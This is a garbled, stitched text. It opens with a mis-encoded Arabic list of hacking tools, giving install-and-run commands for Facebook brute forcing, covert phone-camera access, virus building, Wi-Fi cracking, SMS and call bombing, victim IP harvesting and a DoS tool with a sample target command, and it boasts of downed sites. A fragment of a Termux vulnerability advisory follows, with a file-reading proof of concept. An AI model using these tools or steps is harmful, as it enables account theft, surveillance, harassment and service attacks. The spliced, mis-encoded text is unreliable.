Ø§Ù„Ù‚ÙˆØ© Ø§Ù„ØºØ§Ø´Ù…Ø© Ù„Ø£ØµØ§Ø¨Ø© Ø§ÙŠ Ø¬Ù‡Ø§Ø² Ø§ØªÙ„Ø§Ù Ø¨Ù„ÙØ§ÙŠØ±Ø³:
https://github.com/noob-hackers/infect
ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ Ø¯Ù‚ÙŠÙ‚ ÙˆÙ…Ø¨Ø§Ø´Ø± :
https://github.com/noob-hackers/ipdrone
Ø§Ø¯Ø§Ø© ØµÙ†Ø§Ø¹Ø© ÙØ§ÙŠØ±Ø³ :
pkg update && pkg upgrade -y 

pkg install git -y 

git clone https://github.com/hackerxphantom/HXP-DUCKY 

cd $HOME 

cd HXP-DUCKY 

ls 

bash hxp_ducky.sh

Ø§Ø¯Ø§Ø© Ø§Ø®ØªØ±Ø§Ù‚ ÙƒØ§Ù… Ø§Ù„Ø¬ÙˆØ§Ù„ Ø¨Ø¯ÙˆÙ† ØªÙ†Ø¨ÙŠÙ‡Ø§Øª Ø¨Ø­Ø±ÙŠØ©:
apt update && apt upgrade -y 

apt install git -y 

apt install curl -y 

apt install wget -y 

git clone https://github.com/XPH4N70M/HACK-CAMERA.git 

cd HACK-CAMERA 

bash setup 

Ø§Ø®ØªØ±Ø§Ù‚ ÙˆØ§ÙŠ ÙØ§ÙŠ Ù‚ÙˆØ© Ø§Ù„ØºØ§Ø´Ù…Ø© : Ø±ÙˆØª Ø§Ø¬Ø¨Ø§Ø±ÙŠ 

git clone https://github.com/mkdirlove/WI-TOOLKIT 

cd WI-TOOLKIT 

chmod +x * 

./install.sh 

sudo python wi-toolkit.py 

sudo python2 wi-toolkit.py 

Ø§Ø¯Ø§Ø© Ø¹Ù…Ù„ Ø±ÙˆØª Ù„Ù„Ø§Ù†Ø¯Ø±ÙˆÙŠØ¯:
apt updateÂ  

$ apt upgrade 

$ pkg install git -y 

$ pkg install python 

$ pkg install pyhton2 

$ git clone https://github.com/MaulanaRyM/FakeRoot 

$ cd FakeRoot 

$ chmod +x * 

$ python2 root.py 

Ø§Ù„Ù‚ÙˆØ© Ø§Ù„ØºØ§Ø´Ù…Ø© Ù„Ø§Ø®ØªØ±Ø§Ù‚ ÙÙŠØ³Ø¨ÙˆÙƒ : 

apt update && apt upgrade 

apt-get install python-pip 

pip install colorama termcolor requests 

pip install mechanize 

git clone https://github.com/WHITEDH4CKER/FB-BRUTEFORCE 

cd FB-BRUTEFORCE 

python FB-ATTACK.py 

Ø£Ø¯Ø§Ø© Ø§Ù„Ù‚Ø±ØµÙ†Ø© Ø§Ù„Ø£Ù„Ø¨Ø§Ù†ÙŠÙ‡!! Ø£Ø¯ÙˆØ§Øª Ù„Ù…Ø³Ø§Ø¹Ø¯ØªÙƒ ÙÙŠ Ø§Ù„Ù‚Ø±ØµÙ†Ù‡ Ø§Ù„Ø£Ø®Ù„Ø§Ù‚ÙŠÙ‡ØŒ ÙˆØ§Ø®ØªØ±Ø§Ù‚ ÙˆØ³Ø§Ø¦Ù„ Ø§Ù„ØªÙˆØ§ØµÙ„ Ø§Ù„Ø§Ø¬ØªÙ…Ø§Ø¹ÙŠØŒ ÙˆÙ…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù‡Ø§ØªÙØŒ ÙˆÙ‡Ø¬ÙˆÙ… GmailØŒ ÙˆØ§Ù„Ù‡Ø¬ÙˆÙ… Ø¹Ù„Ù‰ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙØŒ ÙˆØ§ÙƒØªØ´Ø§Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ØŒ ÙˆØ§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù‚ØµÙŠØ±Ù‡ Ø§Ù„Ù…Ø¬Ù‡ÙˆÙ„Ù‡ ÙˆØ§Ø®ØªØ±Ø§Ù‚ ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„ÙˆÙŠØ¨ â€¢ Ø£Ø¯Ø§Ù‡ Ù‚ÙˆÙŠÙ‡ Ù„Ù‡Ø¬ÙˆÙ… DDOS!!
------------------------------------

pkg install git 

git clone https://github.com/4lbH4cker/ALHacking 

cd ALHacking 

bash alhack.sh 

Ø£Ø¯Ø§Ø© Ù„Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ© Ø¹Ø¨Ø± Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª Ù…Ø¹ Ù…ÙŠØ²Ø© Ø¥Ø¸Ù‡Ø§Ø± Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø§Ù„ØªØ«Ø¨ÙŠØª Ø¹Ù„Ù‰
------------------------------------ 

$- apt update 

$- pkg install python3 

$- pkg install python 

$- pip install requests 

$- pip install render 

$- pip install time 

$- pip install bs4 

$- pip install uuid 

$- pip install random 

$- pkg install git 

$- git clone https://github.com/AlmunharifHamoudi/ip.git 

$- cd ip 

$- python ip.py

Ø¹Ø¨Ø± Ù‡Ø§Ø°ÙŠ Ø§Ù„Ø§Ø¯Ø§Ù‡ ÙŠÙ…ÙƒÙ†Ù‡Ø§ Ø§Ù† ØªØ±Ø³Ù„ ÙƒÙ…ÙŠØ© Ù‡Ø§Ø¦Ù„Ø© Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù†ØµÙŠØ© Ø§Ù„Ù‚ØµÙŠØ±Ø© ÙˆØ§Ù„Ù…ÙƒØ§Ù„Ù…Ø§Øª Ø¥Ù„Ù‰ Ù‡Ø¯Ù ÙˆØ§Ø­Ø¯ 

---- 

pkg update 

pkg install python3 python3-pip git -y 

git clone https://github.com/LimerBoy/Impulse 

cd Impulse/ 

pip3 install -r requirements.txt 

python3 impulse.py --help









Ø§Ø¯Ø§Ù‡ Hammer Ù„Ø¹Ù…Ù„ Ø¯ÙˆØ³ ØªØ§Ùƒ Ø¹Ù„Ù‰ ØªØ±ÙŠÙ…ÙƒØ³
ØªØ¹Ø¯ Ù…Ù† Ø§Ù‚ÙˆÙ‰ Ø§Ù„Ø§Ø¯ÙˆØ§Øª Ø­ÙŠØ« ØªÙ… Ø§ØºÙ„Ø§Ù‚ Ø¨ÙŠÙ‡ Ø§Ù„Ø¹Ø¯ÙŠØ¯ Ù…Ù† Ø§Ù„Ù…ÙˆØ§Ù‚Ø¹ Ø§Ù„Ø§Ø³Ø±Ø§Ø¦ÙŠÙ„ÙŠÙ‡ Ùˆ Ø§Ù„Ø§Ø¨Ø§Ø­ÙŠÙ‡ 

--- 

$ pkg update 

$ pkg upgrade 

$ pkg install python 

$ pkg install git 

$ git clone https://github.com/cyweb/hammer 

$ cd hammer 

$ chmod +x hammer.py 

$ python hammer.py 

$ python3 hammer.py -s IP target -p 80 -t 135 

----------------Â Â  
ÙƒÙ„Ø´ÙŠ 
https://github.com/mishakorzik/AllHackingTools/blob/main/.github/TOOLS.md 

sqlmap Ù‡Ùˆ Ø£Ø¯Ø§Ø© Ù…ÙØªÙˆØ­Ø© Ø§Ù„Ù…ØµØ¯Ø± Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚
Ø¨Ø£ØªÙ…ØªØ© Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ÙƒØ´Ù ÙˆØ§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„
Ø­Ù‚Ù† SQL Ø§Ù„Ø¹ÙŠÙˆØ¨ ÙˆØ§Ù„Ø§Ø³ØªÙŠÙ„Ø§Ø¡ Ø¹Ù„Ù‰ Ø®ÙˆØ§Ø¯Ù… Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª.
Ù„Ø£Ù†Ù‡ ÙŠØ£ØªÙŠ Ù…Ø¹ Ù…Ø­Ø±Ùƒ ÙƒØ´Ù Ù‚ÙˆÙŠ ØŒ ÙˆØ§Ù„Ø¹Ø¯ÙŠØ¯ Ù…Ù† Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…ØªØ®ØµØµØ©
Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ ÙˆÙ…Ø¬Ù…ÙˆØ¹Ø© ÙˆØ§Ø³Ø¹Ø© Ù…Ù†
Ù…ÙØ§ØªÙŠØ­ Ø¯Ø§Ø¦Ù…Ø© Ù…Ù† Ø§Ù„Ø¨ØµÙ…Ø§Øª Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØŒ Ø¹Ù„Ù‰ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ù„Ø¨ Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØŒ
Ù„Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ ÙˆØªÙ†ÙÙŠØ° Ø§Ù„Ø£ÙˆØ§Ù…Ø±
Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„ Ø¹Ø¨Ø± Ø§ØªØµØ§Ù„Ø§Øª Ø®Ø§Ø±Ø¬ Ø§Ù„Ù†Ø·Ø§Ù‚.
Ø§Ù„ØªØ±ÙƒÙŠØ¨ :
apt update && apt upgrade
apt install git
apt install python2
apt install python
git cloneÂ https://github.com/sqlmapproject/sqlmap
cd sqlmap
chmod +x *
Run : 
python2 sqlmap.py -h
It shows all options to use this tool sqlmap

@ali963.syğŸ˜


https://insiders.vscode.dev/?vscode-lang=arThe token being previously used and shortcuts created on older versions ofÂ Termux:WidgetÂ were invalidated so that in case a malicious app already had the token, it could not use it anymore and so that users on AndroidÂ >= 8Â were forced to re-create their shortcuts with safer pinned shortcuts API instead of continuing to use the old unsafer static shortcuts API. (32f344ee)

The canonical path of the executable received byÂ TermuxLaunchShortcutActivityÂ wasÂ foundÂ before it was processed. Shortcuts that were broken symlinks or whose canonical path was not under theÂ ~/.shortcutsÂ orÂ ~/.termuxÂ directory wereÂ not shownÂ andÂ execution for the later was not allowedÂ even if the path was sent. (32f344ee,Â 32f344ee,Â bcb0ab6c)

Using pinned shortcuts on android versionÂ >=8Â and not allowing execution of files whose canonical path was not under theÂ ~/.shortcutsÂ orÂ ~/.termuxÂ directory provides reasonable security against any arbitrary code execution or privilege escalation. Users who are on Android versionsÂ < 8Â would still have to use static shortcuts and should be careful about which apps they create a shortcut in, since such apps would be able to execute any scripts under the allowed directories. Users generally should be very careful about which launcher or non-launcher shortcut apps (likeÂ Shortcut Maker) they install on their device, since these apps get to execute dangerous shortcuts for apps which can have serious consequences if not protected properly by the apps.

CheckÂ Termux:WidgetÂ READMEÂ for more details on new design.

3. Termux Files World Readable

This vulnerability allowedÂ all filesÂ underÂ /data/data/com.termux/filesÂ to be readable byÂ any app.

The vulnerability existed sinceÂ v0.47Â (2017-02-28) tillÂ <= v0.117Â and was fixed inÂ v0.118.0Â (2022-01-08).

The vulnerability existed in theÂ termuxÂ ContentProviderÂ declarationÂ since it had setÂ android.permission.permReadÂ asÂ readPermission. Basically, termuxÂ passesÂ theÂ FLAG_GRANT_READ_URI_PERMISSIONÂ flagÂ when user requests to open a file with another app, like withÂ termux-open, so the target app doesn't need to have theÂ android.permission.permReadÂ permission to be able to read the file, which also requiresÂ grantUriPermissions="true"Â in theÂ providerÂ element. However, if some app has the permission, it canÂ readÂ any files underÂ filesÂ directory asÂ set by termuxÂ TermuxOpenReceiver$ContentProvider.openFile().

Issue was that termux did not declare/publish theÂ android.permission.permReadÂ permission, like it does theÂ com.termux.permission.RUN_COMMANDÂ custom permission. Its a dummy permission, likely copied from some tutorial or stackoverflow answer when theÂ ContentProviderÂ was added, since internet searches reveal various random results from different sites for it. It was meant to be replaced with a custom permission published by the app, but it was not. That resulted inÂ any appÂ to just publish the permission in its ownÂ AndroidManifest.xmlÂ and grant itself the permission withÂ uses-permissionÂ entry and then be able toÂ readÂ any files underÂ filesÂ directory.

Note that other apps could onlyÂ readÂ the files, but notÂ writeÂ to them sinceÂ TermuxOpenReceiver$ContentProvider.openFile()Â returned theÂ ParcelFileDescriptor.MODE_READ_ONLYÂ file mode, so writing was not possible and caller would getÂ java.io.IOException: write failed: EBADF (Bad file descriptor)Â errors if it tried to write, There was also noÂ writePermissionÂ set in theÂ providerÂ element. This at least prevented arbitrary code execution and privilege escalation, which obviously would have been much worse for some cases.

3. Proof Of Concept

The following POC reads theÂ /data/data/com.termux/files/home/.bashrcÂ and writes it toÂ /sdcard/bashrc.txt.

private void runTermuxContentProviderReadCommand(Context context) { Uri uri = Uri.parse("content://com.termux.files/data/data/com.termux/files/home/.bashrc"); //Uri uri = Uri.parse("content://com.termux.files/data/data/com.termux/files/usr/bin/login"); InputStream inputStream = null; FileOutputStream fileOutputStream = null; try { inputStream = context.getContentResolver().openInputStream(uri); File outFile = new File(Environment.getExternalStorageDirectory(), "bashrc.txt"); fileOutputStream = new FileOutputStream(outFile); byte[] buffer = new byte[4096]; int readBytes; while ((readBytes = inputStream.read(buffer)) > 0) { Log.d(LOG_TAG, "data: " + new String(buffer, 0, readBytes, Charset.defaultCharset())); fileOutputStream.write(buffer, 0, readBytes); } } catch (Exception e) { e.printStackTrace(); } finally { try { if (inputStream != null) inputStream.close(); if (fileOutputStream != null) fileOutputStream.close(); } catch (IOException e) { e.printStackTrace(); } } } 

<permission android:name="android.permission.permRead" android:description="@string/permission_termux_provider_description" android:icon="@mipmap/ic_launcher" android:label="Termux Provider" android:protectionLevel="normal" /> <uses-permission android:name="android.permission.permRead" /> 

3. Fix

The dummyÂ android.permission.permReadÂ readPermissionÂ wasÂ silentlyÂ replaced withÂ com.termux.permission.RUN_COMMANDÂ inÂ termuxÂ ContentProviderÂ declaration. It seemed appropriate to use the sameÂ com.termux.permission.RUN_COMMANDÂ permission used forÂ RUN_COMMANDÂ intentÂ and other plugin command executions for accessing files as well since commands can access files anyways, and it would be easier for third party apps to request a single permission. (b62645cd)

The file mode returned byÂ TermuxOpenReceiver$ContentProvider.openFile()Â which was previouslyÂ ParcelFileDescriptor.MODE_READ_ONLYÂ was changed toÂ allow both read and write or more specially any file mode defined byÂ ParcelFileDescriptor.parseMode(). With this change, apps that don't have theÂ com.termux.permission.RUN_COMMANDÂ permission are denied access, unless temporary read permission was granted throughÂ termux-open. For apps with the permission, they can use something like the following for reading and writing. Note that writing to external storage will fail withÂ FileÂ APIs (outFile.createNewFile()) if scoped storage restrictions are being enforced for the calling app, like forÂ targetSdkVersionÂ > 28. (b62645cd)

Sample code to read/write termux files for v0.118.0+Â Â The termuxÂ ContentProviderÂ access was only allowed ifÂ allow-external-appsÂ was set toÂ trueÂ inÂ ~/.termux/termux.properties. This also results inÂ termux-openÂ andÂ xdg-openÂ command to silently fail if value is not set toÂ trueÂ inÂ v0.118.0. An error notification will be added in future versions. The caller app likeÂ QuickEditÂ may still show a flash error. CheckÂ https://github.com/termux/termux-tasker#allow-external-apps-property-optionalÂ on info on how to change the value. Write access throughÂ ContentProviderÂ was also disabled forÂ ~/.termux/termux.propertiesÂ so that apps couldn't modify termux settings without user consent, although they can still do it withÂ RUN_COMMANDÂ intent for now, at least until whitelisting commands is implemented to give users more control. (dcedf394,Â e302a14c)3. Discussion

All private files like security keys forÂ sshÂ or encryption keys should be assumed to be compromised for users who were using termux app versionÂ <= v0.117Â . It is highly advisable to replace any such keys with new ones and look into any suspicious authorized access on any remote servers being connected to from termux.

People who are still using Google Playstore version are advised toÂ immediatelyÂ shift to F-Droid or Github releases since updates will not be released on Google Playstore any time soon, if ever, due toÂ AndroidÂ 10Â issues. Playstore builds wereÂ deprecatedÂ more thanÂ ~150Â days ago and are no longer supported. CheckÂ https://github.com/termux/termux-app#installationÂ for more info on where to install/update the Termux app.

Google Playstore, F-Droid and other stores should ideally also add checks to see if any other apps are usingÂ android.permission.permReadÂ orÂ android.permission.permWriteÂ permissions or other dummy permissions found in internet searches in the appÂ ContentProviderÂ declarations and notify their devs since those apps would be vulnerable as well to such vulnerabilities. Moreover, any malicious apps declaring or requesting those permissions should also be caught and removed.

It would also be highly appreciated if any other devs reviewÂ TermuxÂ and plugin apps code for any other potential vulnerabilities that may exist so that they can be fixed as well to provide safer environment for users.

apt update && apt upgrade -y
